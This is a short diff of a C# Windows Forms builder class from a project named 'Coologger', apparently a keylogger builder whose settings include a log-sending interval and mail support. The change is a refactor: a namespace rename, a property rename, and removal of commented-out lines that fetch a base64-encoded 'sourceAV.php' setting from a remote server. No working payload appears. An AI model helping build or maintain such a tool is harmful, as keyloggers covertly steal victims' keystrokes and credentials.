@@ -6,13 +6,12 @@ using System.IO;
 using System.Net;
 using System.Net.Mail;
 using System.Resources;
-using System.Text;
 using System.Threading;
 using System.Windows.Forms;
 using Coologger.Check;
 using Microsoft.VisualBasic;
 
-namespace Coologger
+namespace Coologger.GUI
 {
     public partial class AdvancedForm : Form
     {
@@ -66,10 +65,6 @@ namespace Coologger
             TextBox10.Text = Util.randomString(10);
             TextBox9.Text = Util.randomString(10);
             TextBox5.Text = Util.randomString(20);
-
-            //Global.sourceAv = Encoding.Default.GetString(Convert.FromBase64String(RemoteSettings.GrabSetting("sourceAV.php")));
-            //Global.sourceAv = Encoding.Default.GetString(Convert.FromBase64String(RemoteSettings.GrabSetting("sourceAV.php")));
-            //Global.sourceAv = Encoding.Default.GetString(Convert.FromBase64String(RemoteSettings.GrabSetting("sourceAV.php")));
         }
 
         private void FButton5Click(object sender, EventArgs e)
@@ -117,7 +112,7 @@ namespace Coologger
         private void FButton6Click(object sender, EventArgs e)
         {
             _source = Global.Source;
-            string sourceProtect = Global.sourceProtect;
+            string sourceProtect = Global.SourceProtect;
             if (NumericUpDown1.Value == 0)
             {
                 MessageBox.Show("Please select your log sending interval");
